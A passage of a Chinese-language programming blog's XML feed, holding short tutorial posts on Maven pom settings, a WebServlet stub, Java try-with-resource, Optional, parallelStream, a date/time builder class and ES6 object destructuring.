&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;<span class="variable">$&#123;tomcat.version&#125;</span>&lt;/version&gt;</span><br><span class="line">			&lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;<span class="variable">$&#123;tomcat.version&#125;</span>&lt;/version&gt;</span><br><span class="line">			&lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">	&lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">	&lt;repositories&gt;</span><br><span class="line">		&lt;repository&gt;</span><br><span class="line">			&lt;<span class="built_in">id</span>&gt;in-project&lt;/id&gt;</span><br><span class="line">			&lt;name&gt;In Project Repo&lt;/name&gt;</span><br><span class="line">			&lt;url&gt;file://<span class="variable">$&#123;project.basedir&#125;</span>/lib&lt;/url&gt;</span><br><span class="line">		&lt;/repository&gt;</span><br><span class="line">		&lt;repository&gt;</span><br><span class="line">			&lt;<span class="built_in">id</span>&gt;apache-snapshot&lt;/id&gt;</span><br><span class="line">			&lt;name&gt;Apache Snapshot Repository&lt;/name&gt;</span><br><span class="line">			&lt;url&gt;https://repository.apache.org/content/groups/snapshots/&lt;/url&gt;</span><br><span class="line">		&lt;/repository&gt;</span><br><span class="line">	&lt;/repositories&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<h3 id="WebServlet"><a href="#WebServlet" class="headerlink" title="WebServlet"></a>WebServlet</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">設定@WebServlet(urlPatterns = &#123; <span class="string">&quot;/api/*&quot;</span> &#125;)</span><br><span class="line">Api Url是http://127.0.0.1/api/&#123;method&#125;</span><br><span class="line">------------------------------------------------分隔線---------------------------------------------------------</span><br><span class="line">package com.nv.commons.servlet;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import com.fasterxml.jackson.core.JsonGenerator;;</span><br><span class="line"></span><br><span class="line">@WebServlet(urlPatterns = &#123; <span class="string">&quot;/api/*&quot;</span> &#125;)</span><br><span class="line">public class Servlet extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>pom.xml</tag>
        <tag>WebServlet</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-try-with-resource</title>
    <url>/posts/419580ff/</url>
    <content><![CDATA[<h3 id="Java-try-with-resource"><a href="#Java-try-with-resource" class="headerlink" title="Java-try-with-resource"></a>Java-try-with-resource</h3><span id="more"></span>
<p>Java語言在發展至SE7時加進了try-with-resource的語法，只要「Resource」實作過java.lang.AutoCloseable這個介面，<br>在撰寫程式碼時可以讓整個例外處理的結構變得比較簡潔。</p>
<h3 id="未使用try-with-resouce"><a href="#未使用try-with-resouce" class="headerlink" title="未使用try-with-resouce"></a>未使用try-with-resouce</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// resource 宣告</span><br><span class="line">Resource res = null;</span><br><span class="line">try &#123;</span><br><span class="line">	res = new Resource(); // resource 初始化</span><br><span class="line">	// 其他處理</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception ex) &#123;</span><br><span class="line">	// 例外處理</span><br><span class="line">&#125;</span><br><span class="line">finally &#123;</span><br><span class="line">	// resource 釋放或清除</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用try-with-resouce"><a href="#使用try-with-resouce" class="headerlink" title="使用try-with-resouce"></a>使用try-with-resouce</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// 於 try 關鍵字後的小括號中進行 resource 宣告及初始化</span><br><span class="line">try (Resource res = new Resource()) &#123;</span><br><span class="line">	// 其他處理</span><br><span class="line">	// 在 try 後方小括號初始化的資源會在離開 try 區塊時自動呼叫 close()</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception ex) &#123;</span><br><span class="line">	// 例外處理</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">不過上方結構有些限制，如果需要在catch區塊中存取Resource的變數的話，</span><br><span class="line">只能回到之前不使用try-with-resouce的結構來進行，因為try-with-resource要求</span><br><span class="line">需要被自動呼叫close方法的物件一定要在try後方的小括號中宣告及初始化，否則會引發編譯時期錯誤。</span><br></pre></td></tr></table></figure>

<h3 id="SE9使用try-with-resouce"><a href="#SE9使用try-with-resouce" class="headerlink" title="SE9使用try-with-resouce"></a>SE9使用try-with-resouce</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Java SE9之後針對這個限制進行了一些改變，允許開發者如同未使用try-with-resource一樣</span><br><span class="line">在進入try區塊前先完成宣告及初始化，try之後的小括號中只要列出需要被自動呼叫close方法的變數即可。</span><br><span class="line"></span><br><span class="line">// resource 宣告</span><br><span class="line">Resource res = new Resource();</span><br><span class="line">try (res) &#123;</span><br><span class="line">	// 其他處理</span><br><span class="line">	// 在 try 後方小括號的資源會在離開 try 區塊時自動呼叫 close()</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception ex) &#123;</span><br><span class="line">	// 例外處理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="實際應用"><a href="#實際應用" class="headerlink" title="實際應用"></a>實際應用</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">try (StringWriter out = new StringWriter();</span><br><span class="line">	JsonGenerator jGenerator = JSONUtils.getFactory().createGenerator(out)) &#123;</span><br><span class="line">	jGenerator.writeStartObject();</span><br><span class="line">	jGenerator.writeStringField(<span class="string">&quot;David&quot;</span>, <span class="string">&quot;Chen&quot;</span>);</span><br><span class="line">	jGenerator.writeEndObject();</span><br><span class="line">	jGenerator.flush();</span><br><span class="line">	<span class="built_in">return</span> out.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">這邊要注意的是，不管是哪個版本的try-with-resource結構，其中的resource如果沒有宣告為final變數的話，</span><br><span class="line">也都會被視作是「effectively final（等效final）變數」，也就是不能在其有效範圍中進行變數異動。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>try-with-resource</tag>
      </tags>
  </entry>
  <entry>
    <title>Java8-Optional</title>
    <url>/posts/c24db1c9/</url>
    <content><![CDATA[<h3 id="Java8-Optional"><a href="#Java8-Optional" class="headerlink" title="Java8-Optional"></a>Java8-Optional</h3><span id="more"></span>
<p>Optional是一個class，可以包含也可以不包含非null值。Optional在Java 8中導入。<br>目的是為了解决NullPointerExceptions的問題。<br>A container object which may or may not contain a non-null value.<br>If a value is present, {@code isPresent()} will return {@code true} and<br>{@code get()} will return the value.</p>
<h3 id="before-Optional"><a href="#before-Optional" class="headerlink" title="before Optional"></a>before Optional</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Java 8之前，開發人員在方法內<span class="built_in">return</span> null而不是Optional。這種方法有一些缺點。</span><br><span class="line">第一是没有明確的方法來表示null可能是一個特殊值。相比之下，在API中返回Optional是明確的定義，</span><br><span class="line">其中可能没有值。如果我们要確保不會出現NullPointerExceptions，則需要對每個引用進行檢查。</span><br><span class="line"></span><br><span class="line">private void getIsoCode(User user)&#123;</span><br><span class="line">	<span class="keyword">if</span> (user != null) &#123;</span><br><span class="line">		Address address = user.getAddress();</span><br><span class="line">		<span class="keyword">if</span> (address != null) &#123;</span><br><span class="line">			Country country = address.getCountry();</span><br><span class="line">			<span class="keyword">if</span> (country != null) &#123;</span><br><span class="line">				String isocode = country.getIsocode();</span><br><span class="line">				<span class="keyword">if</span> (isocode != null) &#123;</span><br><span class="line">					isocode = isocode.toUpperCase();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Optional-static-Optional-empty"><a href="#Optional-static-Optional-empty" class="headerlink" title="Optional:static Optional empty()"></a>Optional:static<T> Optional<T> empty()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// Creating an empty optional</span><br><span class="line">Optional&lt;String&gt; empty = Optional.empty();</span><br><span class="line">-----</span><br><span class="line">Returns an empty &#123;@code Optional&#125; instance.  No value is present <span class="keyword">for</span> this Optional.</span><br></pre></td></tr></table></figure>

<h3 id="Optional-static-Optional-of-T-value"><a href="#Optional-static-Optional-of-T-value" class="headerlink" title="Optional:static  Optional of(T value)"></a>Optional:static <T> Optional<T> of(T value)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// Creating an optional using of</span><br><span class="line">String name = <span class="string">&quot;java&quot;</span>;</span><br><span class="line">Optional&lt;String&gt; opt = Optional.of(name);</span><br><span class="line">-----</span><br><span class="line">Returns an &#123;@code Optional&#125; with the specified present non-null value.</span><br></pre></td></tr></table></figure>

<h3 id="Optional-static-Optional-ofNullable-T-value"><a href="#Optional-static-Optional-ofNullable-T-value" class="headerlink" title="Optional:static  Optional ofNullable(T value)"></a>Optional:static <T> Optional<T> ofNullable(T value)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// Possible null value</span><br><span class="line"></span><br><span class="line">Optional&lt;String&gt; optional = Optional.ofNullable(name());</span><br><span class="line"></span><br><span class="line">private String <span class="function"><span class="title">name</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">	String name = <span class="string">&quot;Java&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> (name.length() &gt; 5) ? name : null;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">-----</span><br><span class="line">Returns an &#123;@code Optional&#125; describing the specified value, <span class="keyword">if</span> non-null,</span><br><span class="line">otherwise returns an empty &#123;@code Optional&#125;.</span><br></pre></td></tr></table></figure>

<h3 id="Optional-boolean-isPresent"><a href="#Optional-boolean-isPresent" class="headerlink" title="Optional:boolean isPresent()"></a>Optional:boolean isPresent()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//ispresent</span><br><span class="line"></span><br><span class="line">Optional optional1 = Optional.of(<span class="string">&quot;javaone&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optional1.isPresent()) &#123;</span><br><span class="line"></span><br><span class="line">	//Do something, normally a get</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">-----</span><br><span class="line">Return &#123;@code <span class="literal">true</span>&#125; <span class="keyword">if</span> there is a value present, otherwise &#123;@code <span class="literal">false</span>&#125;.</span><br></pre></td></tr></table></figure>

<h3 id="Optional-void-ifPresent-Consumer-lt-super-T-gt-consumer"><a href="#Optional-void-ifPresent-Consumer-lt-super-T-gt-consumer" class="headerlink" title="Optional:void ifPresent(Consumer&lt;? super T&gt; consumer)"></a>Optional:void ifPresent(Consumer&lt;? super T&gt; consumer)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//ifpresent</span><br><span class="line"></span><br><span class="line">Optional&lt;String&gt; optional1 = Optional.of(<span class="string">&quot;javaone&quot;</span>);</span><br><span class="line"></span><br><span class="line">optional1.ifPresent(s -&gt; System.out.println(s.length()));</span><br><span class="line">-----</span><br><span class="line">If a value is present, invoke the specified consumer with the value,</span><br><span class="line">otherwise <span class="keyword">do</span> nothing.</span><br></pre></td></tr></table></figure>

<h3 id="Optional-T-get"><a href="#Optional-T-get" class="headerlink" title="Optional:T get()"></a>Optional:T get()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//get</span><br><span class="line">Optional&lt;String&gt; optional1 = Optional.of(<span class="string">&quot;javaone&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (optional1.isPresent())&#123; </span><br><span class="line">	String value = optional1.get();</span><br><span class="line">&#125;</span><br><span class="line">-----</span><br><span class="line">If a value is present <span class="keyword">in</span> this &#123;@code Optional&#125;, returns the value,</span><br><span class="line">otherwise throws &#123;@code NoSuchElementException&#125;.</span><br></pre></td></tr></table></figure>

<h3 id="Optional-T-orElse-T-other"><a href="#Optional-T-orElse-T-other" class="headerlink" title="Optional:T orElse(T other)"></a>Optional:T orElse(T other)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//orElse</span><br><span class="line">String nullName = null;</span><br><span class="line">String name = Optional.ofNullable(nullName).orElse(<span class="string">&quot;default_name&quot;</span>);</span><br><span class="line">-----</span><br><span class="line">Return the value <span class="keyword">if</span> present, otherwise <span class="built_in">return</span> &#123;@code other&#125;.</span><br></pre></td></tr></table></figure>

<h3 id="Optional-T-orElseGet-Supplier-lt-extends-T-gt-other"><a href="#Optional-T-orElseGet-Supplier-lt-extends-T-gt-other" class="headerlink" title="Optional:T orElseGet(Supplier&lt;? extends T&gt; other)"></a>Optional:T orElseGet(Supplier&lt;? extends T&gt; other)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//orElseGet</span><br><span class="line">String name = Optional.ofNullable(nullName).orElseGet(() -&gt; &quot;david&quot;);</span><br><span class="line">-----</span><br><span class="line">Return the value if present, otherwise invoke &#123;@code other&#125; and return</span><br><span class="line">the result of that invocation.</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">When to use?</span><br><span class="line">User user = users.stream().findFirst().orElse(new User(<span class="string">&quot;default&quot;</span>, <span class="string">&quot;1234&quot;</span>));</span><br><span class="line">When don<span class="string">&#x27;t use?</span></span><br><span class="line"><span class="string">1.不可序列化</span></span><br><span class="line"><span class="string">2.不能拿來做建構子或方法的參數，會導致代碼變複雜</span></span><br><span class="line"><span class="string">User user = new User(&quot;david@gmail.com&quot;, &quot;1234&quot;, Optional.empty());</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Optional</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-parallelStream</title>
    <url>/posts/41d98bf9/</url>
    <content><![CDATA[<h3 id="關於Java-stream-parallel"><a href="#關於Java-stream-parallel" class="headerlink" title="關於Java-stream parallel"></a>關於Java-stream parallel</h3><span id="more"></span>
<p>stream是Java8中新增的一個特性，被統稱為流。<br>stream更像一個高階版本的 Iterator，而和Iterator不同的是，Stream 可以進行Concurrent操作。</p>
<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);</span><br><span class="line">numbers.parallelStream()</span><br><span class="line">       .forEach(out::println);  </span><br><span class="line">-------------------------------</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">使用parallelStream()會進行Concurrent操作，得到結果的順序不會排序。</span><br></pre></td></tr></table></figure>

<h3 id="可以呼叫forEachOrdered-，可得到按照原來Stream的資料順序"><a href="#可以呼叫forEachOrdered-，可得到按照原來Stream的資料順序" class="headerlink" title="可以呼叫forEachOrdered()，可得到按照原來Stream的資料順序"></a>可以呼叫forEachOrdered()，可得到按照原來Stream的資料順序</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);</span><br><span class="line">numbers.parallelStream()</span><br><span class="line">       .forEachOrdered(out::println); </span><br><span class="line">-------------------------------</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9	   </span><br></pre></td></tr></table></figure>

<h3 id="parallelStream-使用時機"><a href="#parallelStream-使用時機" class="headerlink" title="parallelStream 使用時機"></a>parallelStream 使用時機</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">如果你的原始數據結構是:</span><br><span class="line"></span><br><span class="line">ArrayList、HashMap、HashSet、ConcurrentHashMap、Arrays、int和long的stream，這些適合使用parallelStream</span><br><span class="line"></span><br><span class="line">原因是可以精準切割成任意大小的子程序 讓thread劃分工作變得簡單</span><br><span class="line"></span><br><span class="line">操作上很大程度的影響了Concurrent的效能，如果你在操作做了很多工作 而且工作與工作間彼此依賴(比如說下一個操作依賴於上一個操作)，這種情況不適合Concurrent</span><br><span class="line"></span><br><span class="line">比較好的操作是reduce、min、max、count、<span class="built_in">sum</span>、anyMatch、allMatch、noneMatch</span><br><span class="line"></span><br><span class="line">比較不好的操作是collect</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>parallelStream</tag>
      </tags>
  </entry>
  <entry>
    <title>Java8日期/時間</title>
    <url>/posts/288141a1/</url>
    <content><![CDATA[<h3 id="Java8日期-x2F-時間"><a href="#Java8日期-x2F-時間" class="headerlink" title="Java8日期&#x2F;時間"></a>Java8日期&#x2F;時間</h3><span id="more"></span>
<p>這篇介紹在Java8時間&#x2F;日期轉換的方法。<br>1.以Java 8新的time package為基礎做轉換，效能較佳<br>2.採用builder設計模式跟lambda組合方式，讓程式更直覺<br>3.讓String、Date、Calendar、LocalDateTime的相互轉換更有彈性</p>
<h3 id="DateTimeBuilder"><a href="#DateTimeBuilder" class="headerlink" title="DateTimeBuilder"></a>DateTimeBuilder</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class DateTimeBuilder &#123;</span><br><span class="line"></span><br><span class="line">	@FunctionalInterface</span><br><span class="line">	public interface DateProcessor &#123;</span><br><span class="line">		ZonedDateTime process(ZonedDateTime zonedDateTime);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private final ZonedDateTime zonedDateTime;</span><br><span class="line"></span><br><span class="line">	private List&lt;DateProcessor&gt; dateProcessors = null;</span><br><span class="line"></span><br><span class="line">	public static final TemporalField FIRST_DAY_OF_WEEK = WeekFields.of(DayOfWeek.MONDAY, 1).dayOfWeek();</span><br><span class="line"></span><br><span class="line">	private DateTimeBuilder(ZonedDateTime zonedDateTime) &#123;</span><br><span class="line">		this.zonedDateTime = zonedDateTime;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private DateTimeBuilder(LocalDateTime localDateTime) &#123;</span><br><span class="line">		this.zonedDateTime = ZonedDateTime.of(localDateTime, ZoneId.systemDefault());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private DateTimeBuilder(LocalDateTime localDateTime, ZoneId zoneId) &#123;</span><br><span class="line">		this.zonedDateTime = ZonedDateTime.of(localDateTime, zoneId);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * 採用預設時區</span><br><span class="line">	 *</span><br><span class="line">	 * @<span class="built_in">return</span></span><br><span class="line">	 */</span><br><span class="line">	public static DateTimeBuilder <span class="function"><span class="title">localDateTime</span></span>() &#123;</span><br><span class="line">		<span class="built_in">return</span> new DateTimeBuilder(LocalDateTime.now());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="指定時間"><a href="#指定時間" class="headerlink" title="指定時間"></a>指定時間</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public DateTimeBuilder with(int hour, int minute, int second) &#123;</span><br><span class="line">	add((localDateTime) -&gt; localDateTime.withHour(hour).withMinute(minute).withSecond(second));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder withHour(int value) &#123;</span><br><span class="line">	add((localDateTime) -&gt; localDateTime.withHour(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder withMinute(int value) &#123;</span><br><span class="line">	add((localDateTime) -&gt; localDateTime.withMinute(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder withSecond(int value) &#123;</span><br><span class="line">	add((localDateTime) -&gt; localDateTime.withSecond(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder withMilliSecond(int value) &#123;</span><br><span class="line">	add((localDateTime) -&gt; localDateTime.with(ChronoField.MILLI_OF_SECOND, value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="plus時間"><a href="#plus時間" class="headerlink" title="plus時間"></a>plus時間</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public DateTimeBuilder plusYears(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.plusYears(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder plusMonths(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.plusMonths(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder plusWeeks(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.plusWeeks(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder plusDays(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.plusDays(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder plusHours(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.plus(value, ChronoUnit.HOURS));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder plusMinutes(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.plus(value, ChronoUnit.MINUTES));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder plusSeconds(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.plus(value, ChronoUnit.SECONDS));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder plusMillis(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.plus(value, ChronoUnit.MILLIS));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="minus時間"><a href="#minus時間" class="headerlink" title="minus時間"></a>minus時間</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public DateTimeBuilder minusYears(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.minusYears(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder minusMonths(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.minusMonths(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder minusWeeks(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.minusWeeks(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder minusDays(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.minusDays(value));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder minusHours(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.minus(value, ChronoUnit.HOURS));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder minusMinutes(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.minus(value, ChronoUnit.MINUTES));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder minusSeconds(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.minus(value, ChronoUnit.SECONDS));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public DateTimeBuilder minusMillis(int value) &#123;</span><br><span class="line">	add((zonedDateTime) -&gt; zonedDateTime.minus(value, ChronoUnit.MILLIS));</span><br><span class="line">	<span class="built_in">return</span> this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">DateTimeBuilder.localDateTime().toTimestamp();</span><br><span class="line">DateTimeBuilder.localDateTime().withSecond(0).withMilliSecond(0).minusSeconds(secondsAgo).toTimestamp();</span><br><span class="line">DateTimeBuilder.localDateTime().withMinTime().minusDays(dayAgo).toTimestamp();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>LocalDateTime</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript ES6 Object Destructuration</title>
    <url>/posts/a77add9e/</url>
    <content><![CDATA[<h3 id="JavaScript-ES6-ObjectDestructuration"><a href="#JavaScript-ES6-ObjectDestructuration" class="headerlink" title="JavaScript-ES6-ObjectDestructuration"></a>JavaScript-ES6-ObjectDestructuration</h3><span id="more"></span>
<p>這篇簡介JavaScript-ES6 Object Destructuration。</p>
<h3 id="Object-Destructuration"><a href="#Object-Destructuration" class="headerlink" title="Object Destructuration"></a>Object Destructuration</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Destructuration不僅可以用在array，也可以用在object</span><br><span class="line"><span class="built_in">let</span> &#123; foo, bar &#125; = &#123; foo: <span class="string">&#x27;aaa&#x27;</span>, bar: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">foo // <span class="string">&quot;aaa&quot;</span></span><br><span class="line">bar // <span class="string">&quot;bbb&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="array-Destructuration-versus-object-Destructuration"><a href="#array-Destructuration-versus-object-Destructuration" class="headerlink" title="array Destructuration versus object Destructuration"></a>array Destructuration versus object Destructuration</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">array Destructuration -&gt; 有順序性Destructuration</span><br><span class="line">object Destructuration -&gt; 不存在順序性，variable必須對應屬性名才能取值</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> &#123; bar, foo &#125; = &#123; foo: <span class="string">&#x27;aaa&#x27;</span>, bar: <span class="string">&#x27;bbb&#x27;</span> &#125;;  --&gt; 順序並不影響</span><br><span class="line">foo // <span class="string">&quot;aaa&quot;</span></span><br><span class="line">bar // <span class="string">&quot;bbb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> &#123; baz &#125; = &#123; foo: <span class="string">&#x27;aaa&#x27;</span>, bar: <span class="string">&#x27;bbb&#x27;</span> &#125;;  --&gt; 沒有對應的同名屬性故取不到值，Destructuration失敗故undefined</span><br><span class="line">baz // undefined</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> &#123; foo &#125; = &#123; bar: <span class="string">&#x27;baz&#x27;</span> &#125;; --&gt; = 右邊的object沒有foo屬性，所以variable foo 取不到值，故undefined</span><br><span class="line">foo // undefined</span><br></pre></td></tr></table></figure>

<h3 id="Object-Destructuration-default-value"><a href="#Object-Destructuration-default-value" class="headerlink" title="Object Destructuration default value"></a>Object Destructuration default value</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">let</span> &#123; foo: baz &#125; = &#123; foo: <span class="string">&#x27;aaa&#x27;</span>, bar: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">baz // <span class="string">&quot;aaa&quot;</span></span><br><span class="line"></span><br><span class="line">object Destructuration的內部機制是先找到同名屬性後，將值assign給對應的variable</span><br><span class="line">故真正被assign的是後者(baz)，不是前者(foo)</span><br><span class="line"><span class="built_in">let</span> &#123; foo: baz &#125; = &#123; foo: <span class="string">&#x27;aaa&#x27;</span>, bar: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">baz // <span class="string">&quot;aaa&quot;</span></span><br><span class="line">foo // error: foo is not defined</span><br><span class="line"></span><br><span class="line">default value 生效條件 : object 屬性值 === undefined</span><br><span class="line">var &#123;x = 3&#125; = &#123;&#125;;</span><br><span class="line">x // 3</span><br><span 